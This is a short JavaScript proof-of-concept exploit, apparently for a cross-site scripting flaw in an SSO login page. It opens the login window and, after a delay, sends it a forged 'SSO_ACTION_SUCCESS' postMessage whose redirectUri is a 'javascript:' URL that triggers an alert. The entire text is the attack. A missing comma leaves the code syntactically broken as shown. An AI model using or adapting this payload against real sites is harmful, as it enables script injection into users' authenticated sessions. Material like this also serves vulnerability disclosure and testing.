function xss() {
    var win = window.open('http://example.com/auth/login', '_blank');
    setTimeout(function() {
        win.postMessage({
            'message': 'SSO_ACTION_SUCCESS'
            'props': {
                "oauthProvider": "test",
                "action": "test",
                "redirectUri": "javascript:alert(document.location)"
            }
        }, '*');
    }, 5000);
}